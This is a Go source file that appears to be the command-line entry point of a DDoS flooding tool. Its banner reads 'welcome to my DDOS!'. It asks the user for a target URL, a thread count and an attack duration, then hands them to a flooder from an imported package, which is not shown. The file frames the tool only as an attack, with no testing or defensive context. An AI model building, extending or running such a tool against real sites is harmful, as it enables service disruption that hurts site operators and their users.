package main

import (
	"bufio"
	"ddos-flood/ddos"
	"fmt"
	"log"
	"os"
	"strconv"
	"strings"
)

func main() {
	printIntro()

	url := strings.TrimSpace(getInput("Input URL"))

	threads, err := strconv.Atoi((strings.TrimSpace(getInput("Input Thread Number"))))
	if err != nil {
		log.Fatal(err)
	}

	attackDuration, err := strconv.Atoi(strings.TrimSpace(getInput("Input Attack Duration (seconds)")))
	if err != nil {
		log.Fatal(err)
	}

	flooder := ddos.NewFlooder(url, uint16(threads), uint32(attackDuration))
	flooder.Flood()
}

func printIntro() {
	fmt.Println(`.----------------.  .----------------.  .----------------. `)
	fmt.Println(`| .--------------. || .--------------. || .--------------. |`)
	fmt.Println(`| |  _______     | || | ____    ____ | || |  _______     | |`)
	fmt.Println(`| | |_   __ \    | || ||_   \  /   _|| || | |_   __ \    | |`)
	fmt.Println(`| |   | |__) |   | || |  |   \/   |  | || |   | |__) |   | |`)
	fmt.Println(`| |   |  __ /    | || |  | |\  /| |  | || |   |  __ /    | |`)
	fmt.Println(`| |  _| |  \ \_  | || | _| |_\/_| |_ | || |  _| |  \ \_  | |`)
	fmt.Println(`| | |____| |___| | || ||_____||_____|| || | |____| |___| | |`)
	fmt.Println(`| |              | || |              | || |              | |`)
	fmt.Println(`| '--------------' || '--------------' || '--------------' |`)
	fmt.Println(` '----------------'  '----------------'  '----------------' `)
	fmt.Println("     Hello, My name is Rodolfo, and welcome to my DDOS!")
	fmt.Println()
}

func getInput(prompt string) string {
	fmt.Print(prompt + ": ")
	reader := bufio.NewReader(os.Stdin)
	input, _ := reader.ReadString('\n')
	return input[:len(input)-1] // Remove the newline character
}
